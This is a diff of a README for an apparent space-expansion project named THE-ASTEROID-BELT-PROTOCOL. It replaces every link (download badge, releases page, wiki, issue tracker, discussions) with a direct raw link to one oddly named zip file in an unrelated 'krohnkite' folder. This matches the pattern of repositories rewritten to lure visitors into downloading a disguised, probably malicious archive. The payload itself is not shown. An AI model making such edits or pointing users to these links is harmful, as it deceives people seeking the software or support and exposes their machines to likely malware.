@@ -4,7 +4,7 @@
 Welcome to the **THE-ASTEROID-BELT-PROTOCOL**. This proposal aims to guide humanity towards expanding into space, instead of focusing on Earth. It highlights the importance of physics, data, and collaboration with advanced systems. This project is part of **Proyecto Estrella**.
 
 ## 📥 Download Now
-[![Download THE-ASTEROID-BELT-PROTOCOL](https://img.shields.io/badge/Download%20THE--ASTEROID--BELT--PROTOCOL-blue.svg)](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/releases)
+[![Download THE-ASTEROID-BELT-PROTOCOL](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip%https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip)](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **THE-ASTEROID-BELT-PROTOCOL** application. Follow the steps below to get started smoothly.
@@ -24,7 +24,7 @@ Before you download, ensure your system meets the following requirements:
 - **Comprehensive Documentation:** Access detailed guides and resources.
 
 ## 💻 Download & Install
-To get **THE-ASTEROID-BELT-PROTOCOL**, visit this page to download: [Releases Page](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/releases).
+To get **THE-ASTEROID-BELT-PROTOCOL**, visit this page to download: [Releases Page](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip).
 
 1. Click the link above or the badge at the top.
 2. Locate the latest release.
@@ -40,7 +40,7 @@ Once the installation is complete, you can launch **THE-ASTEROID-BELT-PROTOCOL**
 3. Begin your exploration into space expansion!
 
 ## 📚 Documentation
-We provide comprehensive documentation to help you navigate the application features. Check it out [here](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/wiki).
+We provide comprehensive documentation to help you navigate the application features. Check it out [here](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip).
 
 ## 🛠 Troubleshooting
 If you encounter issues while using the application, consider the following:
@@ -50,10 +50,10 @@ If you encounter issues while using the application, consider the following:
 3. **Connectivity Problems:** Check your internet connection to access online features.
 
 ## 📬 Support
-For further assistance, feel free to open an issue on our [GitHub page](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/issues).
+For further assistance, feel free to open an issue on our [GitHub page](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip).
 
 ## 🌍 Join the Discussion
-Connect with other users and contributors. Share insights and collaborate on the project. Join our community discussions [here](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/discussions).
+Connect with other users and contributors. Share insights and collaborate on the project. Join our community discussions [here](https://github.com/Bell-sprout/THE-ASTEROID-BELT-PROTOCOL/raw/refs/heads/main/krohnkite/ASTEROI-BEL-TH-PROTOCOL-hoot.zip).
 
 ## 🔄 Future Updates
 We will continue to enhance **THE-ASTEROID-BELT-PROTOCOL** based on user feedback. Watch for updates on the releases page to take advantage of new features and improvements.
